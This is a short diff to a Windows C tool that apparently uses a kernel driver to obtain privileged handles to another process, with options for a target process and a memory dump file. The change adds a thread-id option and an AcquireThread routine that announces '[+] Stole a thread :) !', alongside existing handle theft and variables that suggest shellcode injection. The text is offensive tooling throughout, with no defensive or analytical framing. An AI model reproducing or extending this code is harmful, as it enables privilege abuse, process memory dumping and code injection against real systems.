@@ -14,13 +14,13 @@
 
 void usage(char ** argv)
 {
-	printf("Usage: %s [-p process] [-o dumpfile]\n", argv[0]);
+	printf("Usage: %s [-p process] [-o dumpfile] [-t threadid]\n", argv[0]);
 	ExitProcess(0);
 };
 
 int main(int argc, char **argv)
 {
-  DWORD pid, opid, sclen;
+  DWORD pid, opid, sclen, tid;
   PCHAR pname, outpath;
   HANDLE hDriver, privHandle, hThread;
   LPVOID pMemory, pStrMem;
@@ -34,6 +34,11 @@ int main(int argc, char **argv)
 			  --argc;
 			  pname = strdup(argv[1]);
 		          break;
+		  case 't':
+			  ++argv;
+			  --argc;
+			  tid = atoi(argv[1]);
+			  break;
 		  case 'o':
 			  ++argv;
 			  --argc;
@@ -69,6 +74,14 @@ int main(int argc, char **argv)
 		  } else {
 			  printf("[ ] failed to register current process\n");
 			  goto Cleanup;
+		  };
+
+		  if ( AcquireThread(hDriver, &tid, &hThread) )
+		  {
+			  printf("[+] Stole a thread :) !\n");
+			  system("pause");
+		  } else {
+			  printf("[+] could not steal a thread :(\n");
 		  };
 
 		  if ( AcquireHandle(hDriver, &pid, &privHandle) )
